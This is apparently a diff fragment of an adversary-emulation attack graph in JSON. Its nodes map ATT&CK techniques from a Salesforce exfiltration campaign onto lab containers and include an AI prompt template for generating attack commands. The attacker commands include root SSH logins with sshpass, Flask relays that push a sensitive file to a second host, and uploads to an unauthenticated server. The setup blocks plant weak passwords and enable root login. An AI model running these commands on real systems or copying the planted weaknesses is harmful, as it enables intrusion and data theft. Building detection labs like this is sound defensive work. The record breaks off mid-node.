+      "required_prerequisites": [],
+      "provides": [
+        "resources",
+        "infrastructure"
+      ],
+      "attacker_commands": [
+        "curl -F \"file=@/usr/share/doc/python3/examples/antigravity.py\" http://172.21.0.20:8080/upload"
+      ],
+      "target_vuln_host_a": [
+        "apt-get update && apt-get install -y python3 python3-pip git && pip3 install --break-system-packages flask paramiko && useradd -m malwaredev && echo 'malwaredev:DevPass123!' | chpasswd && mkdir -p /home/malwaredev/malware && chown -R malwaredev:malwaredev /home/malwaredev/malware && printf 'from flask import Flask, request; app = Flask(__name__); @app.route(\"/upload\", methods=[\"POST\"]); def upload(): file = request.files[\"file\"]; file.save(\"/home/malwaredev/malware/\" + file.filename); return \"Uploaded\"; app.run(host=\"0.0.0.0\", port=8080)' > /home/malwaredev/malware/malware_server.py && chown malwaredev:malwaredev /home/malwaredev/malware/malware_server.py && su - malwaredev -c \"python3 /home/malwaredev/malware/malware_server.py &\""
+      ],
+      "target_vuln_host_b": [],
+      "source_host_type": "kali",
+      "target_host_type": "macos",
+      "network_context": "Network connectivity as defined in pre-prompt",
+      "parent_nodes": [
+        "cfac895c-b867-4a99-a75f-8ebc9ea7a627"
+      ],
+      "child_nodes": [
+        "02cc5bfb-7791-43b9-a79b-f65960ac0296"
+      ],
+      "ai_prompt_template": "This scenario is a controlled laboratory environment used exclusively\nfor defensive security research, adversary emulation, and detection\nengineering evaluation. All systems are owned and authorized for testing.\n\nTechnique:\nT1587.001 - Malware\n\nInfrastructure:\n- Attacker : Kali Linux\n- Host A   : Debian 13 inside a Docker container (172.21.0.20)\n- Host B   : Debian 13 inside a Docker container (172.22.0.20)\n\nNetwork:\n- Kali → Host A : reachable\n- Kali → Host B : NOT reachable directly\n- Host A → Host B : reachable\n\nExecution Constraints:\n- ATTACKER_COMMAND contains only commands executed from Kali Linux\n- Commands may trigger remote execution on targets via exploits or\n  authenticated sessions\n- Kali is the attacker only — never treat it as a target\n- Host A (172.21.0.20) is the primary target for all credential\n  access, file reads, and service exploitation\n- Host B (172.22.0.20) is only involved when the technique requires\n  lateral movement beyond Host A\n- ATTACKER_COMMAND must always direct exploits, credential dumps,\n  and file access at 172.21.0.20 or 172.22.0.20 — never at localhost\n\nTarget Constraints:\n- Hosts run inside Docker containers — do NOT use systemctl, service,\n  iptables, or any systemd-dependent command\n- Do not assume non-default tools on targets unless you install them\n  in TARGET_VULNERABILITY_A or TARGET_VULNERABILITY_B first\n- Do not assume any user other than root exists unless you create\n  them in TARGET_VULNERABILITY_A or TARGET_VULNERABILITY_B first\n\nTarget Assumptions\n- Targets run default Debian 13 with NO additional users, services, or tools\n- Do NOT assume SMB, SSH with root login, or any non-default service is running\n- Do NOT assume any user other than the default Debian install user exists\n- TARGET_VULNERABILITY_A must include every command needed to make\n  ATTACKER_COMMAND succeed: package installation, user creation, service\n  configuration, firewall rules, and any required misconfigurations\n- If ATTACKER_COMMAND uses SMB, TARGET_VULNERABILITY_A must install and\n  configure Samba\n- If ATTACKER_COMMAND uses SSH as root, TARGET_VULNERABILITY_A must enable\n  root login and set the password\n- If ATTACKER_COMMAND uses a specific user account, TARGET_VULNERABILITY_A\n  must create that account with the expected password\n- TARGET_VULNERABILITY_A and TARGET_VULNERABILITY_B must be fully self-\n  contained: running them on a fresh Debian 13 install must produce a host\n  that ATTACKER_COMMAND can successfully exploit\n\n\nTool Constraints:\n- If an exploit or script is required it must be obtained using:\n  git clone, wget, curl, apt install\n- Do NOT invent exploit scripts\n- Allowed attacker tools: Kali defaults, Metasploit, GitHub PoC exploits\n- When using pip, always add --break-system-packages as follow:\n     pip install --break-system-packages <package-name>\n\nENVIRONMENT CONSTRAINTS\n\n- Targets are Debian-based containers.\n- Containers may not run systemd.\n\nRules:\n- Use `apt-get`, never `apt`.\n- Do not use `systemctl`.\n- Start services directly using their daemon binary when necessary.\n\n- Git commands must run non-interactively.\n- Use public repositories only.\n- Disable credential prompts using:\n- GIT_TERMINAL_PROMPT=0 git clone <repo>\n- Never invent git repository names.\n\nCOMMAND FORMAT RULES\n\n- Each command must be exactly one line.\n- Multi-line shell constructs are forbidden.\n- Do NOT use:\n  - heredoc (<<EOF)\n  - backslash line continuations (\\)\n  - multi-line quoted strings.\n\nIf a file must be written, encode the content as a single line using:\n\nprintf '<content>' > /path/file\n\n\nConsistency Rule (CRITICAL):\n- Generate TARGET_VULNERABILITY_A and TARGET_VULNERABILITY_B FIRST\n- Then write ATTACKER_COMMAND to exactly match what was set up:\n  any credentials, ports, usernames, paths, or service configurations\n  created in the vulnerability blocks must be reused exactly in\n  ATTACKER_COMMAND — do not invent new values\n\nTelemetry:\n- Generate observable artifacts: process execution, network connections,\n  authentication events, file access, service interaction\n- Do NOT suppress logs unless the technique explicitly involves\n  defense evasion\n\nOutput Format (STRICT — no prose, executable commands only):\nTARGET_VULNERABILITY_A:\n<shell commands to run on Host A to create the required condition, or NONE>\nTARGET_VULNERABILITY_B:\n<shell commands to run on Host B to create the required condition, or NONE>\nATTACKER_COMMAND:\n<shell commands executed from Kali Linux>\n<finished>\n\nCAMPAIGN CONTEXT:\nDuring Salesforce Data Exfiltration, threat actors created malicious applications within Salesforce trial accounts, typically Python scripts with similar function to the Salesforce Data Loader.\n\nTECHNIQUE DESCRIPTION:\nAdversaries may develop malware and malware components that can be used during targeting. Building malicious software can include the development of payloads, droppers, post-compromise tools, backdoors (including backdoored images), packers, C2 protocols, and the creation of infected removable media. Adversaries may develop malware to support their operations, creating a means for maintaining control of remote machines, evading defenses, and executing post-compromise behaviors.\nDuring malware development, adversaries may intentionally include indicators aligned with other known actors in order to mislead attribution by defenders.\nAs with legitimate development efforts, different skill sets may be required for developing malware. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's malware development capabilities, provided the adversary plays a role in shaping requirements and maintains a degree of exclusivity to the malware.\nSome aspects of malware development, such as C2 protocol development, may require adversaries to obtain additional infrastructure. For example, malware developed that will communicate with Twitter for C2, may require use of Web Services.",
+      "validation_rules": [
+        "Command must execute without errors",
+        "Expected artifacts must be generated",
+        "Telemetry must be captured",
+        "No unintended system modifications"
+      ],
+      "cleanup_template": "No cleanup required",
+      "satisfied_prerequisites": [],
+      "unsatisfied_prerequisites": [],
+      "executed": false,
+      "execution_result": null,
+      "executor": null,
+      "discovered_ips": [],
+      "discovered_hostnames": [],
+      "discovered_usernames": []
+    },
+    {
+      "node_id": "02cc5bfb-7791-43b9-a79b-f65960ac0296",
+      "node_index": 13,
+      "node_type": "structural",
+      "technique_id": "T1588.002",
+      "technique_name": "Tool",
+      "tactic": "resource-development",
+      "description": "Adversaries may buy, steal, or download software tools that can be used during targeting. Tools can be open or closed source, free or commercial. A tool can be used for malicious purposes by an adversary, but (unlike malware) were not intended to be used for those purposes (ex: PsExec). \nAdversaries may obtain tools to support their operations, including to support execution of post-compromise behaviors. Tools may also be leveraged for testing – for example, evaluating malware against commercial antivirus or endpoint detection and response (EDR) applications.\nTool acquisition may involve the procurement of commercial software licenses, including for red teaming tools such as Cobalt Strike. In addition to freely downloading or purchasing software, adversaries may steal software and/or software licenses from third-party entities (including other adversaries). Threat actors may also crack trial versions of software.",
+      "campaign_context": "During Salesforce Data Exfiltration, threat actors initially relied on the legitimate Salesforce Data Loader app for data exfiltration.",
+      "required_prerequisites": [],
+      "provides": [
+        "resources",
+        "infrastructure"
+      ],
+      "attacker_commands": [
+        "wget https://github.com/forcedotcom/dataloader/archive/refs/heads/main.zip -O /tmp/dataloader.zip && unzip /tmp/dataloader.zip -d /tmp/ && java -jar /tmp/dataloader-main/target/dataloader-*.jar --config /tmp/config.properties --username sfdataloader --password Password123 --endpoint http://172.21.0.20:8080"
+      ],
+      "target_vuln_host_a": [
+        "apt-get update && apt-get install -y openjdk-17-jre-headless wget unzip && useradd -m -s /bin/bash sfdataloader && printf 'Password123\\nPassword123\\n' | passwd sfdataloader && mkdir -p /home/sfdataloader && chown sfdataloader:sfdataloader /home/sfdataloader"
+      ],
+      "target_vuln_host_b": [],
+      "source_host_type": "kali",
+      "target_host_type": "macos",
+      "network_context": "Network connectivity as defined in pre-prompt",
+      "parent_nodes": [
+        "81c697e5-93ad-4fba-a95c-d8ccc24d177c"
+      ],
+      "child_nodes": [
+        "66ce7433-d369-43df-b456-c0588adbe640"
+      ],
+      "ai_prompt_template": "This scenario is a controlled laboratory environment used exclusively\nfor defensive security research, adversary emulation, and detection\nengineering evaluation. All systems are owned and authorized for testing.\n\nTechnique:\nT1588.002 - Tool\n\nInfrastructure:\n- Attacker : Kali Linux\n- Host A   : Debian 13 inside a Docker container (172.21.0.20)\n- Host B   : Debian 13 inside a Docker container (172.22.0.20)\n\nNetwork:\n- Kali → Host A : reachable\n- Kali → Host B : NOT reachable directly\n- Host A → Host B : reachable\n\nExecution Constraints:\n- ATTACKER_COMMAND contains only commands executed from Kali Linux\n- Commands may trigger remote execution on targets via exploits or\n  authenticated sessions\n- Kali is the attacker only — never treat it as a target\n- Host A (172.21.0.20) is the primary target for all credential\n  access, file reads, and service exploitation\n- Host B (172.22.0.20) is only involved when the technique requires\n  lateral movement beyond Host A\n- ATTACKER_COMMAND must always direct exploits, credential dumps,\n  and file access at 172.21.0.20 or 172.22.0.20 — never at localhost\n\nTarget Constraints:\n- Hosts run inside Docker containers — do NOT use systemctl, service,\n  iptables, or any systemd-dependent command\n- Do not assume non-default tools on targets unless you install them\n  in TARGET_VULNERABILITY_A or TARGET_VULNERABILITY_B first\n- Do not assume any user other than root exists unless you create\n  them in TARGET_VULNERABILITY_A or TARGET_VULNERABILITY_B first\n\nTarget Assumptions\n- Targets run default Debian 13 with NO additional users, services, or tools\n- Do NOT assume SMB, SSH with root login, or any non-default service is running\n- Do NOT assume any user other than the default Debian install user exists\n- TARGET_VULNERABILITY_A must include every command needed to make\n  ATTACKER_COMMAND succeed: package installation, user creation, service\n  configuration, firewall rules, and any required misconfigurations\n- If ATTACKER_COMMAND uses SMB, TARGET_VULNERABILITY_A must install and\n  configure Samba\n- If ATTACKER_COMMAND uses SSH as root, TARGET_VULNERABILITY_A must enable\n  root login and set the password\n- If ATTACKER_COMMAND uses a specific user account, TARGET_VULNERABILITY_A\n  must create that account with the expected password\n- TARGET_VULNERABILITY_A and TARGET_VULNERABILITY_B must be fully self-\n  contained: running them on a fresh Debian 13 install must produce a host\n  that ATTACKER_COMMAND can successfully exploit\n\n\nTool Constraints:\n- If an exploit or script is required it must be obtained using:\n  git clone, wget, curl, apt install\n- Do NOT invent exploit scripts\n- Allowed attacker tools: Kali defaults, Metasploit, GitHub PoC exploits\n- When using pip, always add --break-system-packages as follow:\n     pip install --break-system-packages <package-name>\n\nENVIRONMENT CONSTRAINTS\n\n- Targets are Debian-based containers.\n- Containers may not run systemd.\n\nRules:\n- Use `apt-get`, never `apt`.\n- Do not use `systemctl`.\n- Start services directly using their daemon binary when necessary.\n\n- Git commands must run non-interactively.\n- Use public repositories only.\n- Disable credential prompts using:\n- GIT_TERMINAL_PROMPT=0 git clone <repo>\n- Never invent git repository names.\n\nCOMMAND FORMAT RULES\n\n- Each command must be exactly one line.\n- Multi-line shell constructs are forbidden.\n- Do NOT use:\n  - heredoc (<<EOF)\n  - backslash line continuations (\\)\n  - multi-line quoted strings.\n\nIf a file must be written, encode the content as a single line using:\n\nprintf '<content>' > /path/file\n\n\nConsistency Rule (CRITICAL):\n- Generate TARGET_VULNERABILITY_A and TARGET_VULNERABILITY_B FIRST\n- Then write ATTACKER_COMMAND to exactly match what was set up:\n  any credentials, ports, usernames, paths, or service configurations\n  created in the vulnerability blocks must be reused exactly in\n  ATTACKER_COMMAND — do not invent new values\n\nTelemetry:\n- Generate observable artifacts: process execution, network connections,\n  authentication events, file access, service interaction\n- Do NOT suppress logs unless the technique explicitly involves\n  defense evasion\n\nOutput Format (STRICT — no prose, executable commands only):\nTARGET_VULNERABILITY_A:\n<shell commands to run on Host A to create the required condition, or NONE>\nTARGET_VULNERABILITY_B:\n<shell commands to run on Host B to create the required condition, or NONE>\nATTACKER_COMMAND:\n<shell commands executed from Kali Linux>\n<finished>\n\nCAMPAIGN CONTEXT:\nDuring Salesforce Data Exfiltration, threat actors initially relied on the legitimate Salesforce Data Loader app for data exfiltration.\n\nTECHNIQUE DESCRIPTION:\nAdversaries may buy, steal, or download software tools that can be used during targeting. Tools can be open or closed source, free or commercial. A tool can be used for malicious purposes by an adversary, but (unlike malware) were not intended to be used for those purposes (ex: PsExec). \nAdversaries may obtain tools to support their operations, including to support execution of post-compromise behaviors. Tools may also be leveraged for testing – for example, evaluating malware against commercial antivirus or endpoint detection and response (EDR) applications.\nTool acquisition may involve the procurement of commercial software licenses, including for red teaming tools such as Cobalt Strike. In addition to freely downloading or purchasing software, adversaries may steal software and/or software licenses from third-party entities (including other adversaries). Threat actors may also crack trial versions of software.",
+      "validation_rules": [
+        "Command must execute without errors",
+        "Expected artifacts must be generated",
+        "Telemetry must be captured",
+        "No unintended system modifications"
+      ],
+      "cleanup_template": "No cleanup required",
+      "satisfied_prerequisites": [],
+      "unsatisfied_prerequisites": [],
+      "executed": false,
+      "execution_result": null,
+      "executor": null,
+      "discovered_ips": [],
+      "discovered_hostnames": [],
+      "discovered_usernames": []
+    },
+    {
+      "node_id": "66ce7433-d369-43df-b456-c0588adbe640",
+      "node_index": 14,
+      "node_type": "structural",
+      "technique_id": "T1020",
+      "technique_name": "Automated Exfiltration",
+      "tactic": "exfiltration",
+      "description": "Adversaries may exfiltrate data, such as sensitive documents, through the use of automated processing after being gathered during Collection. \nWhen automated exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as Exfiltration Over C2 Channel and Exfiltration Over Alternative Protocol.",
+      "campaign_context": "During Salesforce Data Exfiltration, threat actors used API queries to automatically exfiltrate large volumes of data.",
+      "required_prerequisites": [
+        "data:collected",
+        "c2:established"
+      ],
+      "provides": [
+        "exfiltrated_data"
+      ],
+      "attacker_commands": [
+        "sshpass -p RootPass123 ssh -o StrictHostKeyChecking=no root@172.21.0.20 'printf \"from flask import Flask, request\\nimport requests\\napp=Flask(__name__)\\n@app.route(\\\"/exfiltrate\\\", methods=[\\\"POST\\\"])\\ndef exfiltrate():\\n data=request.data\\n requests.post(\\\"http://172.22.0.20:5000/receive\\\", data=data)\\n return \\\"OK\\\"\\napp.run(host=\\\"0.0.0.0\\\", port=5000)\" > /root/exfiltrate.py && python3 /root/exfiltrate.py &' ; sshpass -p RootPass123 ssh -o StrictHostKeyChecking=no root@172.22.0.20 'printf \"from flask import Flask, request\\napp=Flask(__name__)\\n@app.route(\\\"/receive\\\", methods=[\\\"POST\\\"])\\ndef receive():\\n with open(\\\"/root/exfiltrated_data.txt\\\", \\\"ab\\\") as f:\\n  f.write(request.data)\\n return \\\"Received\\\"\\napp.run(host=\\\"0.0.0.0\\\", port=5000)\" > /root/receiver.py && python3 /root/receiver.py &' ; sshpass -p RootPass123 ssh -o StrictHostKeyChecking=no root@172.21.0.20 'cat /root/sensitive_data.txt | curl -X POST --data-binary @- http://127.0.0.1:5000/exfiltrate'"
+      ],
+      "target_vuln_host_a": [
+        "apt-get update;apt-get install -y python3 python3-pip openssh-server;mkdir -p /var/run/sshd;echo 'root:RootPass123' | chpasswd;sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config;sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config;/usr/sbin/sshd;pip3 install --break-system-packages flask requests"
+      ],
+      "target_vuln_host_b": [
+        "apt-get update;apt-get install -y python3 python3-pip openssh-server;mkdir -p /var/run/sshd;echo 'root:RootPass123' | chpasswd;sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config;sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config;/usr/sbin/sshd;pip3 install --break-system-packages flask"
+      ],
+      "source_host_type": "kali",
+      "target_host_type": "macos",
+      "network_context": "Host A can establish outbound data transfer (from pre-prompt)",
+      "parent_nodes": [
+        "02cc5bfb-7791-43b9-a79b-f65960ac0296"
+      ],
+      "child_nodes": [
+        "8bef15d9-9b74-4db3-a894-a1b7c09ca128"
+      ],
+      "ai_prompt_template": "This scenario is a controlled laboratory environment used exclusively\nfor defensive security research, adversary emulation, and detection\nengineering evaluation. All systems are owned and authorized for testing.\n\nTechnique:\nT1020 - Automated Exfiltration\n\nInfrastructure:\n- Attacker : Kali Linux\n- Host A   : Debian 13 inside a Docker container (172.21.0.20)\n- Host B   : Debian 13 inside a Docker container (172.22.0.20)\n\nNetwork:\n- Kali → Host A : reachable\n- Kali → Host B : NOT reachable directly\n- Host A → Host B : reachable\n\nExecution Constraints:\n- ATTACKER_COMMAND contains only commands executed from Kali Linux\n- Commands may trigger remote execution on targets via exploits or\n  authenticated sessions\n- Kali is the attacker only — never treat it as a target\n- Host A (172.21.0.20) is the primary target for all credential\n  access, file reads, and service exploitation\n- Host B (172.22.0.20) is only involved when the technique requires\n  lateral movement beyond Host A\n- ATTACKER_COMMAND must always direct exploits, credential dumps,\n  and file access at 172.21.0.20 or 172.22.0.20 — never at localhost\n\nTarget Constraints:\n- Hosts run inside Docker containers — do NOT use systemctl, service,\n  iptables, or any systemd-dependent command\n- Do not assume non-default tools on targets unless you install them\n  in TARGET_VULNERABILITY_A or TARGET_VULNERABILITY_B first\n- Do not assume any user other than root exists unless you create\n  them in TARGET_VULNERABILITY_A or TARGET_VULNERABILITY_B first\n\nTarget Assumptions\n- Targets run default Debian 13 with NO additional users, services, or tools\n- Do NOT assume SMB, SSH with root login, or any non-default service is running\n- Do NOT assume any user other than the default Debian install user exists\n- TARGET_VULNERABILITY_A must include every command needed to make\n  ATTACKER_COMMAND succeed: package installation, user creation, service\n  configuration, firewall rules, and any required misconfigurations\n- If ATTACKER_COMMAND uses SMB, TARGET_VULNERABILITY_A must install and\n  configure Samba\n- If ATTACKER_COMMAND uses SSH as root, TARGET_VULNERABILITY_A must enable\n  root login and set the password\n- If ATTACKER_COMMAND uses a specific user account, TARGET_VULNERABILITY_A\n  must create that account with the expected password\n- TARGET_VULNERABILITY_A and TARGET_VULNERABILITY_B must be fully self-\n  contained: running them on a fresh Debian 13 install must produce a host\n  that ATTACKER_COMMAND can successfully exploit\n\n\nTool Constraints:\n- If an exploit or script is required it must be obtained using:\n  git clone, wget, curl, apt install\n- Do NOT invent exploit scripts\n- Allowed attacker tools: Kali defaults, Metasploit, GitHub PoC exploits\n- When using pip, always add --break-system-packages as follow:\n     pip install --break-system-packages <package-name>\n\nENVIRONMENT CONSTRAINTS\n\n- Targets are Debian-based containers.\n- Containers may not run systemd.\n\nRules:\n- Use `apt-get`, never `apt`.\n- Do not use `systemctl`.\n- Start services directly using their daemon binary when necessary.\n\n- Git commands must run non-interactively.\n- Use public repositories only.\n- Disable credential prompts using:\n- GIT_TERMINAL_PROMPT=0 git clone <repo>\n- Never invent git repository names.\n\nCOMMAND FORMAT RULES\n\n- Each command must be exactly one line.\n- Multi-line shell constructs are forbidden.\n- Do NOT use:\n  - heredoc (<<EOF)\n  - backslash line continuations (\\)\n  - multi-line quoted strings.\n\nIf a file must be written, encode the content as a single line using:\n\nprintf '<content>' > /path/file\n\n\nConsistency Rule (CRITICAL):\n- Generate TARGET_VULNERABILITY_A and TARGET_VULNERABILITY_B FIRST\n- Then write ATTACKER_COMMAND to exactly match what was set up:\n  any credentials, ports, usernames, paths, or service configurations\n  created in the vulnerability blocks must be reused exactly in\n  ATTACKER_COMMAND — do not invent new values\n\nTelemetry:\n- Generate observable artifacts: process execution, network connections,\n  authentication events, file access, service interaction\n- Do NOT suppress logs unless the technique explicitly involves\n  defense evasion\n\nOutput Format (STRICT — no prose, executable commands only):\nTARGET_VULNERABILITY_A:\n<shell commands to run on Host A to create the required condition, or NONE>\nTARGET_VULNERABILITY_B:\n<shell commands to run on Host B to create the required condition, or NONE>\nATTACKER_COMMAND:\n<shell commands executed from Kali Linux>\n<finished>\n\nCAMPAIGN CONTEXT:\nDuring Salesforce Data Exfiltration, threat actors used API queries to automatically exfiltrate large volumes of data.\n\nTECHNIQUE DESCRIPTION:\nAdversaries may exfiltrate data, such as sensitive documents, through the use of automated processing after being gathered during Collection. \nWhen automated exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as Exfiltration Over C2 Channel and Exfiltration Over Alternative Protocol.",
+      "validation_rules": [
+        "Command must execute without errors",
+        "Expected artifacts must be generated",
+        "Telemetry must be captured",
+        "No unintended system modifications"
+      ],
+      "cleanup_template": "No cleanup required",
+      "satisfied_prerequisites": [],
+      "unsatisfied_prerequisites": [
+        "data:collected",
+        "c2:established"
+      ],
+      "executed": false,
+      "execution_result": null,
+      "executor": null,
+      "discovered_ips": [],
+      "discovered_hostnames": [],
+      "discovered_usernames": []
+    },
+    {
+      "node_id": "8bef15d9-9b74-4db3-a894-a1b7c09ca128",
+      "node_index": 15,
+      "node_type": "structural",
+      "technique_id": "T1586.002",
+      "technique_name": "Email Accounts",
+      "tactic": "resource-development",
+      "description": "Adversaries may compromise email accounts that can be used during targeting. Adversaries can use compromised email accounts to further their operations, such as leveraging them to conduct Phishing for Information, Phishing, or large-scale spam email campaigns. Utilizing an existing persona with a compromised email account may engender a level of trust in a potential victim if they have a relationship with, or knowledge of, the compromised persona. Compromised email accounts can also be used in the acquisition of infrastructure (ex: Domains).\nA variety of methods exist for compromising email accounts, such as gathering credentials via Phishing for Information, purchasing credentials from third-party sites, brute forcing credentials (ex: password reuse from breach credential dumps), or paying employees, suppliers or business partners for access to credentials. Prior to compromising email accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation. Adversaries may target compromising well-known email accounts or domains from which malicious spam or Phishing emails may evade reputation-based email filtering rules.\nAdversaries can use a compromised email account to hijack existing email threads with targets of interest.",
+      "campaign_context": "During Salesforce Data Exfiltration, threat actors used compromised emails to create Salesforce trial accounts.",
+      "required_prerequisites": [],
+      "provides": [
+        "resources",
+        "infrastructure"
+      ],
+      "attacker_commands": [
+        "echo -e \"a login emailuser EmailPass123\\r\\n\" | timeout 5 openssl s_client -connect 172.21.0.20:143 -ign_eof | grep -i 'OK' && timeout 10 openssl s_client -connect 172.21.0.20:143 -crlf < <(echo -e 'a login emailuser EmailPass123\\r\\nb list \"\" \"*\"\\r\\nc logout\\r\\n')"
+      ],
+      "target_vuln_host_a": [
+        "apt-get update && apt-get install -y dovecot-imapd dovecot-pop3d mailutils && printf 'userdb {\\n  driver = passwd\\n}\\npassdb {\\n  driver = pam\\n}\\nprotocols = imap pop3\\nlisten = *\\n' > /etc/dovecot/dovecot.conf && mkdir -p /var/mail && useradd -m -p $(openssl passwd -1 \"EmailPass123\") emailuser && echo \"emailuser:EmailPass123\" | chpasswd && /usr/lib/dovecot/imap-login -o syslog_facility=mail -o syslog_debug=yes -o listen=172.21.0.20 &"
+      ],
+      "target_vuln_host_b": [],
+      "source_host_type": "kali",
+      "target_host_type": "macos",
+      "network_context": "Network connectivity as defined in pre-prompt",
+      "parent_nodes": [
+        "66ce7433-d369-43df-b456-c0588adbe640"
+      ],
+      "child_nodes": [
+        "bde025cc-9f68-45dc-b78b-3cfdb7289ea4"
+      ],
+      "ai_prompt_template": "This scenario is a controlled laboratory environment used exclusively\nfor defensive security research, adversary emulation, and detection\nengineering evaluation. All systems are owned and authorized for testing.\n\nTechnique:\nT1586.002 - Email Accounts\n\nInfrastructure:\n- Attacker : Kali Linux\n- Host A   : Debian 13 inside a Docker container (172.21.0.20)\n- Host B   : Debian 13 inside a Docker container (172.22.0.20)\n\nNetwork:\n- Kali → Host A : reachable\n- Kali → Host B : NOT reachable directly\n- Host A → Host B : reachable\n\nExecution Constraints:\n- ATTACKER_COMMAND contains only commands executed from Kali Linux\n- Commands may trigger remote execution on targets via exploits or\n  authenticated sessions\n- Kali is the attacker only — never treat it as a target\n- Host A (172.21.0.20) is the primary target for all credential\n  access, file reads, and service exploitation\n- Host B (172.22.0.20) is only involved when the technique requires\n  lateral movement beyond Host A\n- ATTACKER_COMMAND must always direct exploits, credential dumps,\n  and file access at 172.21.0.20 or 172.22.0.20 — never at localhost\n\nTarget Constraints:\n- Hosts run inside Docker containers — do NOT use systemctl, service,\n  iptables, or any systemd-dependent command\n- Do not assume non-default tools on targets unless you install them\n  in TARGET_VULNERABILITY_A or TARGET_VULNERABILITY_B first\n- Do not assume any user other than root exists unless you create\n  them in TARGET_VULNERABILITY_A or TARGET_VULNERABILITY_B first\n\nTarget Assumptions\n- Targets run default Debian 13 with NO additional users, services, or tools\n- Do NOT assume SMB, SSH with root login, or any non-default service is running\n- Do NOT assume any user other than the default Debian install user exists\n- TARGET_VULNERABILITY_A must include every command needed to make\n  ATTACKER_COMMAND succeed: package installation, user creation, service\n  configuration, firewall rules, and any required misconfigurations\n- If ATTACKER_COMMAND uses SMB, TARGET_VULNERABILITY_A must install and\n  configure Samba\n- If ATTACKER_COMMAND uses SSH as root, TARGET_VULNERABILITY_A must enable\n  root login and set the password\n- If ATTACKER_COMMAND uses a specific user account, TARGET_VULNERABILITY_A\n  must create that account with the expected password\n- TARGET_VULNERABILITY_A and TARGET_VULNERABILITY_B must be fully self-\n  contained: running them on a fresh Debian 13 install must produce a host\n  that ATTACKER_COMMAND can successfully exploit\n\n\nTool Constraints:\n- If an exploit or script is required it must be obtained using:\n  git clone, wget, curl, apt install\n- Do NOT invent exploit scripts\n- Allowed attacker tools: Kali defaults, Metasploit, GitHub PoC exploits\n- When using pip, always add --break-system-packages as follow:\n     pip install --break-system-packages <package-name>\n\nENVIRONMENT CONSTRAINTS\n\n- Targets are Debian-based containers.\n- Containers may not run systemd.\n\nRules:\n- Use `apt-get`, never `apt`.\n- Do not use `systemctl`.\n- Start services directly using their daemon binary when necessary.\n\n- Git commands must run non-interactively.\n- Use public repositories only.\n- Disable credential prompts using:\n- GIT_TERMINAL_PROMPT=0 git clone <repo>\n- Never invent git repository names.\n\nCOMMAND FORMAT RULES\n\n- Each command must be exactly one line.\n- Multi-line shell constructs are forbidden.\n- Do NOT use:\n  - heredoc (<<EOF)\n  - backslash line continuations (\\)\n  - multi-line quoted strings.\n\nIf a file must be written, encode the content as a single line using:\n\nprintf '<content>' > /path/file\n\n\nConsistency Rule (CRITICAL):\n- Generate TARGET_VULNERABILITY_A and TARGET_VULNERABILITY_B FIRST\n- Then write ATTACKER_COMMAND to exactly match what was set up:\n  any credentials, ports, usernames, paths, or service configurations\n  created in the vulnerability blocks must be reused exactly in\n  ATTACKER_COMMAND — do not invent new values\n\nTelemetry:\n- Generate observable artifacts: process execution, network connections,\n  authentication events, file access, service interaction\n- Do NOT suppress logs unless the technique explicitly involves\n  defense evasion\n\nOutput Format (STRICT — no prose, executable commands only):\nTARGET_VULNERABILITY_A:\n<shell commands to run on Host A to create the required condition, or NONE>\nTARGET_VULNERABILITY_B:\n<shell commands to run on Host B to create the required condition, or NONE>\nATTACKER_COMMAND:\n<shell commands executed from Kali Linux>\n<finished>\n\nCAMPAIGN CONTEXT:\nDuring Salesforce Data Exfiltration, threat actors used compromised emails to create Salesforce trial accounts.\n\nTECHNIQUE DESCRIPTION:\nAdversaries may compromise email accounts that can be used during targeting. Adversaries can use compromised email accounts to further their operations, such as leveraging them to conduct Phishing for Information, Phishing, or large-scale spam email campaigns. Utilizing an existing persona with a compromised email account may engender a level of trust in a potential victim if they have a relationship with, or knowledge of, the compromised persona. Compromised email accounts can also be used in the acquisition of infrastructure (ex: Domains).\nA variety of methods exist for compromising email accounts, such as gathering credentials via Phishing for Information, purchasing credentials from third-party sites, brute forcing credentials (ex: password reuse from breach credential dumps), or paying employees, suppliers or business partners for access to credentials. Prior to compromising email accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation. Adversaries may target compromising well-known email accounts or domains from which malicious spam or Phishing emails may evade reputation-based email filtering rules.\nAdversaries can use a compromised email account to hijack existing email threads with targets of interest.",
+      "validation_rules": [
+        "Command must execute without errors",
+        "Expected artifacts must be generated",
+        "Telemetry must be captured",
+        "No unintended system modifications"
+      ],
+      "cleanup_template": "No cleanup required",
+      "satisfied_prerequisites": [],
+      "unsatisfied_prerequisites": [],
+      "executed": false,
+      "execution_result": null,
+      "executor": null,
+      "discovered_ips": [],
+      "discovered_hostnames": [],
+      "discovered_usernames": []
+    },
+    {
+      "node_id": "bde025cc-9f68-45dc-b78b-3cfdb7289ea4",
+      "node_index": 16,
+      "node_type": "structural",
+      "technique_id": "T1598.004",
+      "technique_name": "Spearphishing Voice",
+      "tactic": "reconnaissance",
+      "description": "Adversaries may use voice communications to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: Impersonation) and/or creating a sense of urgency or alarm for the recipient.\nAll forms of phishing are electronically delivered social engineering. In this scenario, adversaries use phone calls to elicit sensitive information from victims. Known as voice phishing (or \"vishing\"), these communications can be manually executed by adversaries, hired call centers, or even automated via robocalls. Voice phishers may spoof their phone number while also posing as a trusted entity, such as a business partner or technical support staff.\nVictims may also receive phishing messages that direct them to call a phone number (\"callback phishing\") where the adversary attempts to collect confidential information.\nAdversaries may also use information from previous reconnaissance efforts (ex: Search Open Websites/Domains or Search Victim-Owned Websites) to tailor pretexts to be even more persuasive and believable for the victim.",
+      "campaign_context": "During Salesforce Data Exfiltration, threat actors initiated voice calls with victims to socially engineer them into authorizing malicious applications or divulging sensitive credentials.",
+      "required_prerequisites": [],
+      "provides": [
+        "target_intel"
+      ],
+      "attacker_commands": [
